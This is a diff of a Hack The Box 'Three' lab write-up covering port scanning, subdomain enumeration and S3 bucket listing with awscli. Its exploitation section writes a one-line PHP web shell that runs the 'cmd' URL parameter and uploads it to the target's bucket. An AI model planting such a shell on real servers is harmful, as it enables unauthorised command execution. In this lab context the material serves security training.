@@ -2,11 +2,11 @@
 ## Platform: HTB
 ## Date: 06/27/26
 ## Difficulty: Easy
-## Tools: 
+## Tools: Nmap, Gobuster, AWSCLI, Netcat
 
 
 
-### Recon 
+### Recon & Enumeration
  Scanned target for open ports 
  ```bash
 sudo nmap -sV 10.129.126.39
@@ -23,9 +23,11 @@ Visited the website of the target IP and viewed the page source.
 
 Found contact form containing a reference to a .php page indicating the web application backend is built using php 
 
-![Website-Page-Source](Images/three_pagesource)
+![Website-Page-Source](Images/three_pagesource.jpeg)
 
 Navigated to the broken Contact page which contained an email "thetoppers.htb"
+
+---
 
 ***Subdomain Enumeration***
 
@@ -52,28 +54,29 @@ aws --endpoint=http://thetoppers.htb s3 ls s3://thetoppers.htb
 ![S3-Bucket-Objects](Images/three_bucket-objects.jpeg)
 
 
-The s3 bucket object index.php confirms that the website is running PHP
+The s3 bucket object index.php confirmed that the website is running PHP
 
-
+---
 
 
 ### Exploitation
 
-Created a PHP function and file to take the URL parameter cmd as an input and execute it as a system command
+**Initial Access**
+
+Created a PHP function and file to take the URL parameter cmd as an input and execute it as a system command: 
 
 ```bash
-echo '<?php system($_GET['cmd']); ?>' >  shell.php
+echo '<?php system($_GET["cmd"]); ?>' >  shell.php
 ```
 
 ![Shell-Payload](Images/three_shell-payload.jpeg)
 
 
-Uploaded the PHP shell file to the S3 bucket 
+Uploaded the PHP shell file to the S3 bucket:
 
 ```bash 
-aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+aws --endpoint=http://s3.thetoppers.htb/ s3 cp shell.php s3://thetoppers.htb
 ```
-
 
 ![Shell-Upload](Images/three_shell-upload.jpeg)
 
